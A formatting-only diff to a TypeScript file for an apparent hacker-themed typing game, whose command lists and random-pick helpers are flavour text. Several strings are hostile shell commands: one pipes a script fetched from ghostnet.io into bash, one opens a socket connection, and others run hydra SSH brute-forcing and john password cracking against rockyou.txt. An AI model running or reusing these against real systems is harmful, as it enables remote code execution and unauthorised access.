@@ -24,7 +24,7 @@ export const EASY_COMMANDS = [
 	'traceroute darknet.io',
 	'uptime && free -m',
 	'echo $PATH | tr : "\\n"',
-	'history | tail -20'
+	'history | tail -20',
 ];
 
 /** Medium length commands */
@@ -43,7 +43,7 @@ export const MEDIUM_COMMANDS = [
 	'wget -q -O - https://ghostnet.io/inject | bash',
 	'docker run -d --rm -p 8080:80 ghostnet/proxy:latest',
 	'git clone --depth 1 git@ghost:exploit/zero-day.git',
-	'python3 -c "import socket; s=socket.socket(); s.connect((host,port))"'
+	'python3 -c "import socket; s=socket.socket(); s.connect((host,port))"',
 ];
 
 /** Long/complex commands (hard difficulty) */
@@ -57,15 +57,11 @@ export const HARD_COMMANDS = [
 	'john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 shadow.txt',
 	'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1 -t 4 -V',
 	'wpscan --url https://target.io --enumerate u,vp,vt --api-token $WP_TOKEN',
-	'gobuster dir -u https://target.io -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html'
+	'gobuster dir -u https://target.io -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html',
 ];
 
 /** All commands combined */
-export const TYPING_COMMANDS = [
-	...EASY_COMMANDS,
-	...MEDIUM_COMMANDS,
-	...HARD_COMMANDS
-];
+export const TYPING_COMMANDS = [...EASY_COMMANDS, ...MEDIUM_COMMANDS, ...HARD_COMMANDS];
 
 // ════════════════════════════════════════════════════════════════
 // HELPERS
@@ -74,7 +70,7 @@ export const TYPING_COMMANDS = [
 /** Get a random command of specified difficulty */
 export function getRandomCommand(difficulty?: 'easy' | 'medium' | 'hard'): string {
 	let pool: string[];
-	
+
 	switch (difficulty) {
 		case 'easy':
 			pool = EASY_COMMANDS;
@@ -88,7 +84,7 @@ export function getRandomCommand(difficulty?: 'easy' | 'medium' | 'hard'): strin
 		default:
 			pool = TYPING_COMMANDS;
 	}
-	
+
 	return pool[Math.floor(Math.random() * pool.length)];
 }
 
@@ -108,7 +104,7 @@ export function getDifficultyReward(difficulty: 'easy' | 'medium' | 'hard'): {
 		case 'easy':
 			return { deathRateReduction: 0.05, label: '-5% Death Rate' };
 		case 'medium':
-			return { deathRateReduction: 0.10, label: '-10% Death Rate' };
+			return { deathRateReduction: 0.1, label: '-10% Death Rate' };
 		case 'hard':
 			return { deathRateReduction: 0.15, label: '-15% Death Rate' };
 	}
